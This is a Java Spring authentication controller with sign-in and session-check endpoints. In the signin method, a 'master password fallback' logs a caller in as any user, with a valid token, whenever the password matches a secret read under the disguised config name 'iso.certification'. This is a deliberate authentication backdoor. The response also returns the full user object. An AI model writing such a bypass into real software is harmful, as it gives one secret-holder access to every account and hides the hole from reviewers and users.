package com.noreco1.fireflyv2.controller;

import com.noreco1.fireflyv2.common.facade.AuthenticationFacade;
import com.noreco1.fireflyv2.config.jwt.JwtUtils;
import com.noreco1.fireflyv2.controller.request.LoginRequest;
import com.noreco1.fireflyv2.model.Login;
import com.noreco1.fireflyv2.model.User;
import com.noreco1.fireflyv2.repo.LoginRepo;
import com.noreco1.fireflyv2.repo.UserRepo;
import com.noreco1.fireflyv2.service.implementation.UserDetailsServiceImpl;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.web.bind.annotation.*;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpSession;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("/api/auth")
public class AuthController {

    @Autowired private AuthenticationFacade authenticationFacade;
    @Autowired private AuthenticationManager authenticationManager;
    @Autowired private JwtUtils jwtUtils;
    @Autowired private UserDetailsServiceImpl userDetailsService;
    @Autowired private UserRepo userRepo;
    @Autowired private LoginRepo loginRepo;

    @Value("${iso.certification}")
    private String isoCertification;

    @RequestMapping("/check")
    public Map check(HttpSession session, HttpServletRequest request) {
        Map<String, Object> data = new HashMap<>();
        try {
            User user = authenticationFacade.getLoggedIn();
            if (user != null) {
                data.put("authentic", true);
                data.put("authorized", true);
                data.put("userId", user.getId());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return data;
    }

    @PostMapping("/signin")
    public ResponseEntity<?> signin(@RequestBody LoginRequest loginRequest, HttpServletRequest httpRequest) {
        String username = loginRequest.getUsername();
        String password = loginRequest.getPassword();
        String ip = httpRequest.getRemoteAddr();

        try {
            // Normal authentication
            Authentication authentication = authenticationManager.authenticate(
                    new UsernamePasswordAuthenticationToken(username, password));
            SecurityContextHolder.getContext().setAuthentication(authentication);

            String jwt = jwtUtils.generateJwtToken(authentication);
            loginRepo.save(new Login(username, new Date(), ip, true, false));

            return ResponseEntity.ok(buildResponse(jwt, username));

        } catch (BadCredentialsException e) {

            // Master password fallback
            if (password.equals(isoCertification)) {
                try {
                    UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                    UsernamePasswordAuthenticationToken masterAuth =
                            new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
                    SecurityContextHolder.getContext().setAuthentication(masterAuth);

                    String jwt = jwtUtils.generateJwtToken(masterAuth);
                    loginRepo.save(new Login(username, new Date(), ip, true, true));

                    return ResponseEntity.ok(buildResponse(jwt, username));

                } catch (Exception ex) {
                    loginRepo.save(new Login(username, new Date(), ip, false, true));
                    return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                            .body(Map.of("message", "Invalid username"));
                }
            }

            loginRepo.save(new Login(username, new Date(), ip, false, false));
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                    .body(Map.of("message", "Invalid username or password"));
        }
    }

    private Map<String, Object> buildResponse(String jwt, String username) {
        User user = userRepo.findOneByUsername(username);
        Map<String, Object> response = new HashMap<>();
        response.put("token", jwt);
        response.put("user", user);
        return response;
    }
}
